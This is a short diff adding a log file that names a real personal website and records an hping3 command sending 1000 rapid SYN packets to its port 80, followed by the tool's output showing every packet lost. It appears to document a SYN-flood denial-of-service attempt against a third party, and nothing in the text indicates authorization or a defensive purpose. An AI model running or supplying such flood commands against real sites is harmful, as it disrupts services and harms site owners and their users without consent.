@@ -1,0 +1,11 @@
+website: https://www.tuckermax.com/
+
+command:
+hping3 www.tuckermax.com -c 1000 --faster --syn -s 3105 -p 80
+
+
+HPING www.tuckermax.com (eth0 76.223.9.102): S set, 40 headers + 0 data bytes
+
+--- www.tuckermax.com hping statistic ---
+1000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
